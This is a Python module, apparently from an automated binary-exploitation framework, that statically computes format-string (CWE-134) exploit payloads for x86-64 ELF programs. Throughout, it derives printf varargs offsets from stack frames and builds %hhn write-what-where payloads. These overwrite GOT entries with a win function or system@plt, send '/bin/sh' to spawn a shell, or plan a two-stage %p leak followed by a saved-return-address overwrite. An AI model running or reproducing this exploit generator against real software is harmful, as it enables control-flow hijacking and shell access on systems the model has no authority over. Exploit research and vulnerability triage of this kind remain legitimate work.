"""Static format-string (CWE-134) write-what-where recipe: the exact %hhn payload, computed from
the recovered program with NO execution.

`build_exploit(strategy="format")` weaponizes a `printf(user)` sink by RUNNING it: a %p dump finds
where the format buffer lands in printf's varargs, then a %hhn write is confirmed live. When the
target cannot run here (air-gap, missing shared libraries, foreign CPU) that path produced, at best, a
prose recipe ("find the offset with a %p dump..."). But every number that dump would measure is a
literal fact of the binary on x86-64 SysV:

  * the format register (rdi for printf, rsi for fprintf/sprintf/dprintf/syslog, rdx for snprintf)
    is fed by `lea reg,[rbp-X]` -- the format IS the stack buffer at rbp-X;
  * the frame prologue fixes rsp at the call: rsp == rbp - F, F = 8*pushes + `sub rsp,N`;
  * printf's first stack vararg is positional index 6-k (k = the format's register slot), so the
    buffer's first word is `%{6-k + (F-X)/8}$` -- the arg offset, exactly;
  * the write target is a GOT slot (no PIE: absolute; partial RELRO: writable) of a function the
    code calls AFTER the sink, and the value is a win function / `system@plt` read from the image.

From those the payload is `fmt.fmtstr_payload(arg_offset, {slot: value})`, emitted as concrete bytes
plus the follow-up input. Where a fact is NOT literal (PIE / full RELRO -> the target address needs a
leak; the format is a pointer to a non-stack buffer -> the offset needs a probe) the recipe says so
and hands over the exact next step -- a two-stage leak+write with computed %p indices and the
relocation arithmetic, or the probe payload -- never a guessed number.

Honesty: every recipe is filed through `recipe.file_recipe` (`corroborated`, never a verified PoC)
with its assumptions spelled out. x86-64 only for the computed offset; other targets get the
probe-first recipe."""
from __future__ import annotations

import logging
from typing import Optional

from ... import observe
from . import elfstatic, fmt, x64frame

_log = logging.getLogger(__name__)

#: printf-family function -> index of its FORMAT among the SysV integer argument registers.
FMT_ARG_INDEX = {"printf": 0, "fprintf": 1, "dprintf": 1, "sprintf": 1, "snprintf": 2,
                 "syslog": 1}
#: Never a useful GOT target after the sink: only reached on failure (or never returns normally
#: through a hijack we can stage).
_NOT_TARGET = {"__stack_chk_fail", "abort", "__assert_fail", "_exit"}
#: Readers that stop at a newline -- a payload byte 0x0a truncates them.
_LINE_READERS = {"fgets", "gets", "getline", "getdelim", "scanf", "fscanf"}
#: Readers that stop at ANY whitespace (scanf %s).
_WS_READERS = {"scanf", "fscanf", "sscanf"}
#: (buffer arg index, size arg index or None) for the readers that fill a buffer we can track.
_READER_ARGS = {"fgets": (0, 1), "read": (1, 2), "recv": (1, 2), "gets": (0, None),
                "fread": (0, None), "getline": (0, None)}


def _x86_64(target) -> bool:
    a = (getattr(target, "arch", "") or "").lower().replace("_", "-")
    return a in ("x86-64", "amd64", "x64") and int(getattr(target, "bits", 64) or 64) == 64


def _imm_into(win: list, reg: str) -> Optional[int]:
    """The immediate the newest `mov reg, imm` in `win` loads (sub-registers included), or None."""
    for t in reversed(win):
        mn, ops = x64frame._split(t)
        if len(ops) < 2 or x64frame._FULL.get(ops[0].lower()) != reg:
            continue
        if mn == "mov":
            try:
                return int(ops[1], 0)
            except ValueError:
                return None
        return None
    return None


def _reader_of(instrs: list, slot) -> tuple:
    """(reader name, capacity or None) of the input call in the same function that fills the stack
    slot `slot` (a ("stack", base, disp) source). (None, None) when no tracked reader fills it."""
    for k, (_a, t) in enumerate(instrs):
        name = x64frame.call_target(t)
        if name not in _READER_ARGS and name not in _WS_READERS:
            continue
        before = [x for _, x in instrs[:k]]
        if name in _WS_READERS:                           # scanf("%s", buf): buffer is rsi
            src = x64frame.pointer_source(before, "rsi")
            if src and src[0] == "stack" and src[1:] == slot[1:]:
                return name, None
            continue
        bi, si = _READER_ARGS[name]
        src = x64frame.pointer_source(before, x64frame.ARG_REGS[bi])
        if not (src and src[0] == "stack" and src[1:] == slot[1:]):
            continue
        cap = _imm_into(x64frame.arg_window(instrs, k), x64frame.ARG_REGS[si]) if si is not None \
            else None
        return name, cap
    return None, None


def format_layout(ir, site_addr, fname: str) -> Optional[dict]:
    """The stack geometry of a printf-family call at `site_addr`, read off the function IR.

    None when the call is not the CWE-134 shape (literal/indeterminate format, or format arguments
    are passed). Otherwise a dict:
      kind            "stack" (format = a stack buffer; offset computable) | "pointer" (format loaded
                      from a local -- the buffer is elsewhere, the offset needs a probe)
      arg_offset      1-based positional index of the buffer's first aligned word (stack kind)
      pad             bytes of prefix that align the payload to that word
      first_stack     positional index of printf's first stack vararg (6-k)
      frame           F (rsp == rbp - F at the call), saved_rbp_index / ret_index (positional %p
                      indices that disclose the saved rbp and the return address), when the frame
                      is a literal rbp frame
      loop            the sink is re-executed (a later branch jumps back over it)
      after           direct callees after the site, in order
      reader / cap    the input call that fills the buffer and its byte capacity, when tracked
    """
    k = FMT_ARG_INDEX.get(fname)
    if k is None:
        return None
    instrs = x64frame.instructions(ir)
    idx = x64frame.site_index(instrs, site_addr)
    if idx is None:
        return None
    reg = x64frame.ARG_REGS[k]
    before = [t for _, t in instrs[:idx]]
    src = x64frame.pointer_source(before, reg)
    if src is None or src[0] == "literal":
        return None
    win = x64frame.arg_window(instrs, idx)
    for r in x64frame.ARG_REGS[k + 1:]:                   # printf(fmt, x) is not the bug
        if any(x64frame._dest_full(t)[1] == r for t in win):
            return None
    first = 6 - k
    F = x64frame.rsp_below_rbp(instrs, idx)
    out = {"func": fname, "fmt_reg": reg, "first_stack": first, "kind": "pointer",
           "loop": x64frame.in_loop(instrs, idx), "after": x64frame.calls_after(instrs, idx),
           "frame": F, "site": instrs[idx][0], "reader": None, "cap": None}
    if F is not None and F % 8 == 0:
        out["saved_rbp_index"] = first + F // 8
        out["ret_index"] = first + F // 8 + 1
    if src[0] == "stack":
        if src[1] == "rsp" and any(x64frame._split(t)[0] in ("push", "pop") for t in win):
            D = None
        else:
            D = x64frame.stack_disp_below_rsp(instrs, idx, src)
        if D is not None:
            pad = (-D) % 8
            out.update(kind="stack", buf_disp=D, pad=pad, arg_offset=first + (D + pad) // 8,
                       slot=src)
            out["reader"], out["cap"] = _reader_of(instrs, src)
        else:
            out["kind"] = "pointer"                       # a stack buffer we cannot place exactly
    return out


def _bad_bytes(payload: bytes, reader: Optional[str]) -> list:
    bad = []
    if reader in _LINE_READERS and b"\n" in payload:
        bad.append("0x0a (the line reader stops at a newline)")
    if reader in _WS_READERS and any(c in payload for c in b" \t\n\v\f\r"):
        bad.append("whitespace (scanf %s stops at it)")
    return bad


def _pick_got_target(layout: dict, got: dict, *, include_sink: bool, avoid=None):
    avoid = avoid or set()                                # slots the win calls -> would recurse
    for n in layout.get("after") or []:
        if n in got and n not in _NOT_TARGET and n not in avoid \
                and (n != layout["func"] or include_sink):
            return n
    if include_sink and layout["func"] in got and layout["func"] not in avoid:
        return layout["func"]
    return None


def plan_format_write(target_bytes: bytes, layout: dict, *, win=None) -> Optional[dict]:
    """The concrete write-what-where plan for one sink layout. `win` = (name, vaddr) or None.

    Returns {technique, target_level, payload, input, followup, summary, steps, assumptions,
    writes, stage} or None when no plan can be stated (no layout)."""
    if not layout:
        return None
    from . import rop
    try:
        got = rop.got_entries(target_bytes)
    except Exception:                                    # noqa: BLE001
        got = {}
    bind_now = False
    try:
        bind_now = rop.has_bind_now(target_bytes)
    except Exception:                                    # noqa: BLE001
        observe.absorbed(_log, "assuming lazy binding")
    pie = elfstatic.is_pie(target_bytes)
    plt = elfstatic.plt_stubs(target_bytes)
    win_calls = elfstatic.plt_callees(target_bytes, int(win[1])) if win and win[1] else set()
    fname = layout["func"]
    assumptions = [f"the {fname}() format buffer carries attacker input (its provenance is "
                   "structural -- a run-time buffer passed as the format with zero format "
                   "arguments -- not taint-proven)"]
    if fname == "syslog":
        assumptions.append("syslog counts its header in %n: add the header length to `written`")
    if fname in ("sprintf", "snprintf"):
        assumptions.append(f"{fname} renders into a destination buffer; the %c padding counts "
                           "toward it (an snprintf cap still lets %n count past the limit)")

    # ---- the format buffer is not at a computable stack offset: probe first --------------------
    if layout["kind"] != "stack":
        probe = fmt.probe_payload(count=40)
        tgt = _pick_got_target(layout, got, include_sink=layout.get("loop", False))
        where = (f"then plant the write with fmt.fmtstr_payload(<index>, {{{tgt}@GOT "
                 f"{got[tgt]:#x}: <value>}})" if (tgt and not pie and not bind_now) else
                 "then plant the write onto a saved return / function pointer once its address "
                 "is known")
        return {"technique": "format-string %hhn write-what-where (offset by probe)",
                "target_level": "L2", "stage": "probe", "payload": probe, "input": probe,
                "followup": b"", "writes": {},
                "summary": (f"{fname}() takes its format from a pointer loaded from the frame (the "
                            "buffer is not a stack local), so the varargs index of the controlled "
                            "bytes is not a literal fact: send the probe, take the 1-based %p "
                            "position where 0x4141414141414141 prints as the arg offset, " + where),
                "steps": ["deliver the probe payload and read the %p dump",
                          "arg offset = position of 0x4141414141414141 (fmt.find_fmt_offset)",
                          where],
                "assumptions": assumptions + ["the format buffer's contents land in printf's "
                                              "varargs window (true for a stack copy; a heap "
                                              "format needs a stack pointer chain instead)"]}

    off, pad = layout["arg_offset"], layout["pad"]
    assumptions.append(
        f"arg offset {off}: the format is the stack buffer {layout['buf_disp']} bytes above rsp at "
        f"the call (frame F={layout.get('frame')}), and {fname}'s first stack vararg is "
        f"%{layout['first_stack']}$ (x86-64 SysV)")

    # ---- one-shot GOT overwrite (no PIE, writable GOT) -----------------------------------------
    if not pie and not bind_now and got:
        writes, value_desc, followup, tgt = {}, None, b"", None
        if win and win[1]:
            tgt = _pick_got_target(layout, got, include_sink=layout.get("loop", False),
                                   avoid=win_calls)
            if tgt:
                writes = {got[tgt]: int(win[1])}
                value_desc = f"&{win[0]} ({int(win[1]):#x})"
        if not writes and fname == "printf" and layout.get("loop") and "system" in plt \
                and "printf" in got:
            tgt = "printf"
            writes = {got["printf"]: plt["system"]}
            value_desc = f"system@plt ({plt['system']:#x})"
            followup = b"/bin/sh\n"
        if writes:
            body = fmt.fmtstr_payload(off, writes, written=pad, nbytes=6)
            payload = b"A" * pad + body
            line = payload + (b"\n" if layout.get("reader") in _LINE_READERS or
                              layout.get("reader") is None else b"")
            trig = ("the next loop iteration calls printf(<your line>) -> system(<your line>); "
                    "send '/bin/sh'" if followup else
                    f"the program's next call to {tgt}() enters {value_desc}")
            steps = [f"send the {len(payload)}-byte payload as the format: it writes "
                     f"{value_desc} over {tgt}@GOT ({got[tgt]:#x}) with %hhn at arg offset {off}",
                     trig]
            notes = list(assumptions) + [
                f"no PIE: {tgt}@GOT is at the fixed address {got[tgt]:#x}",
                "partial/no RELRO: the GOT is writable at run time",
                f"{tgt}() is called after the sink" + (" (the sink is in a loop)"
                                                       if layout.get("loop") else "")]
            cap = layout.get("cap")
            if cap is not None and len(payload) + 1 > cap:
                notes.append(f"WARNING: the payload ({len(payload)} B) exceeds the {cap}-byte "
                             f"{layout.get('reader')} read -- split the write across iterations")
            bad = _bad_bytes(payload, layout.get("reader"))
            if bad:
                notes.append("WARNING: the payload contains " + ", ".join(bad))
            return {"technique": f"format-string %hhn GOT overwrite ({tgt}@GOT := "
                                 f"{'system' if followup else (win[0] if win else '?')})",
                    "target_level": "L3", "stage": "one-shot", "payload": payload,
                    "input": line + followup, "followup": followup, "writes": writes,
                    "summary": (f"{fname}(buf) at {layout['site']:#x}: buffer at arg offset {off}; "
                                f"%hhn-write {value_desc} over {tgt}@GOT ({got[tgt]:#x}) -- "
                                f"payload {payload[:48]!r}{'...' if len(payload) > 48 else ''}"),
                    "steps": steps, "assumptions": notes}

    # ---- PIE / full RELRO: leak, then write the saved return (two-stage) ------------------------
    why_two = ("PIE: image addresses are offsets until the base is leaked" if pie
               else "full RELRO: the GOT is read-only" if bind_now
               else "no GOT slot / win to aim at")
    ri, si = layout.get("ret_index"), layout.get("saved_rbp_index")
    if ri and layout.get("loop"):
        leak = f"%{si}$p.%{ri}$p\n".encode()
        value = (f"&{win[0]} = leaked_ret - <return-site offset> + {int(win[1]):#x}" if (win and pie)
                 else f"&{win[0]} ({int(win[1]):#x})" if win else "a one-gadget / win address")
        return {"technique": "format-string two-stage: %p leak, then %hhn saved-return overwrite",
                "target_level": "L3", "stage": "two-stage", "payload": leak, "input": leak,
                "followup": b"", "writes": {},
                "summary": (f"{fname}(buf) at {layout['site']:#x} ({why_two}): stage 1 sends "
                            f"{leak!r} -- %{si}$p discloses the saved rbp (caller frame) and "
                            f"%{ri}$p the return address into the image; stage 2 sends "
                            f"fmt.fmtstr_payload({off}, {{ret_slot: {value}}}) with ret_slot = "
                            f"<this frame's rbp> + 8, and the write fires when the function returns"),
                "steps": [f"stage 1: send {leak!r}; read the two hex words",
                          "image base = leaked return address - its static return-site offset",
                          "this frame's rbp = leaked caller rbp - (caller frame size) - 16; "
                          "return slot = rbp + 8",
                          f"stage 2: send fmt.fmtstr_payload({off}, {{return slot: win}}, "
                          f"written={pad}) prefixed by {pad} pad byte(s)",
                          "make the loop exit so the function returns into win"],
                "assumptions": assumptions + [why_two, "the sink is reached at least twice in the "
                                              "same process (it is in a loop)"]}
    return {"technique": "format-string %hhn write-what-where (computed offset)",
            "target_level": "L2", "stage": "offset-only", "payload": b"", "input": b"",
            "followup": b"", "writes": {},
            "summary": (f"{fname}(buf) at {layout['site']:#x}: the controlled buffer is at arg "
                        f"offset {off} (computed from the frame); a %hhn write-what-where is "
                        f"fmt.fmtstr_payload({off}, {{addr: value}}) -- no fixed write target here "
                        f"({why_two}"
                        + ("; the sink runs once, so a leak cannot precede the write"
                           if not layout.get("loop") else "") + ")"),
            "steps": [f"arg offset {off} (pad {pad})", "choose a writable target + value",
                      f"send fmt.fmtstr_payload({off}, {{target: value}}, written={pad})"],
            "assumptions": assumptions + [why_two]}


# ------------------------------------------------------------------------------------- filing
def _fmt_leads(conn, target) -> list:
    from ...db.dao import FindingDAO
    out, seen = [], set()
    rows = [f for f in FindingDAO(conn).list_by_target(target.id)
            if f.cwe == "CWE-134" and f.function_addr and f.site_addr]
    # the precise detector first, then anything with taint evidence, then the rest
    rows.sort(key=lambda f: (f.detector != "format_string",
                             not any("taint" in str(e.get("channel", "")) for e in f.evidence or []),
                             -(f.confidence or 0)))
    for f in rows:
        if f.site_addr in seen:
            continue
        seen.add(f.site_addr)
        out.append(f)
    return out


def _function_ir(conn, target_id, faddr):
    from ...db.dao import FunctionDAO
    fd = FunctionDAO(conn)
    try:
        want = int(faddr, 16) if isinstance(faddr, str) else int(faddr)
    except (TypeError, ValueError):
        return None
    for f in fd.list_by_target(target_id):
        try:
            a = int(f.addr, 16) if isinstance(f.addr, str) else int(f.addr)
        except (TypeError, ValueError):
            continue
        if a == want:
            full = fd.get(f.id)
            return getattr(full, "ir", None) if full else None
    return None


def _sink_name(ir, site_addr) -> Optional[str]:
    instrs = x64frame.instructions(ir)
    k = x64frame.site_index(instrs, site_addr)
    return x64frame.call_target(instrs[k][1]) if k is not None else None


def _already_exploited(conn, target) -> bool:
    from ...db.dao import FindingDAO
    return any((f.dedup_key or "").startswith("exploit:format") and f.state == "poc-backed"
               for f in FindingDAO(conn).list_by_target(target.id))


def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[bytes] = None,
                              max_sites: int = 3) -> list:
    """For each CWE-134 lead with a recoverable site, compute the %hhn plan and file it as a
    corroborated recipe carrying the payload bytes. Returns the filed finding ids ([] when there is
    no CWE-134 lead, the target is not x86-64, or a format exploit is already demonstrated).
    Never raises."""
    from . import exploit, recipe
    fids = []
    try:
        if not _x86_64(target) or _already_exploited(ctx.conn, target):
            return []
        leads = _fmt_leads(ctx.conn, target)
        if not leads:
            return []
        if target_bytes is None:
            target_bytes = ctx.content.path(target.sha256).read_bytes()
        try:
            from ...db.dao import CallEdgeDAO
            edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
        except Exception:                                # noqa: BLE001
            edges = None
        win = exploit.find_win(exploit.elf_functions(target_bytes), call_edges=edges)
        win = win if win and win[0] else None
        done = 0
        for lead in leads:
            if done >= max_sites:
                break
            ir = _function_ir(ctx.conn, target.id, lead.function_addr)
            if not ir:
                continue
            name = _sink_name(ir, lead.site_addr)
            layout = format_layout(ir, lead.site_addr, name or "")
            plan = plan_format_write(target_bytes, layout, win=win) if layout else None
            if not plan:
                continue
            done += 1
            site = f"{layout['site']:#x}"
            extra = [{"channel": "recipe-assumptions",
                      "detail": "; ".join(plan["assumptions"])}]
            if plan.get("writes"):
                extra.append({"channel": "recipe-plan", "detail": (
                    f"arg_offset={layout.get('arg_offset')} pad={layout.get('pad')} writes="
                    + ", ".join(f"{a:#x}<-{v:#x}" for a, v in plan["writes"].items()))})
            fid = recipe.file_recipe(
                ctx, target, cwe="CWE-134", technique=plan["technique"],
                target_level=plan["target_level"], severity="high", detector="fmt_recipe",
                dedup_key=f"recipe:CWE-134:fmt-write:{site}:{target.id}",
                title=f"Exploitation recipe: {plan['technique']} at {site}",
                summary=plan["summary"], steps=plan["steps"], why_not_executed=why,
                lead=lead, extra_evidence=extra,
                input_bytes=plan["input"] or None, input_mode="stdin")
            if fid:
                fids.append(fid)
    except Exception:                                    # noqa: BLE001 -- advisory, never fatal
        observe.absorbed(_log, "format-write recipe not filed")
    return fids


__all__ = ["FMT_ARG_INDEX", "format_layout", "plan_format_write", "file_format_write_recipes"]

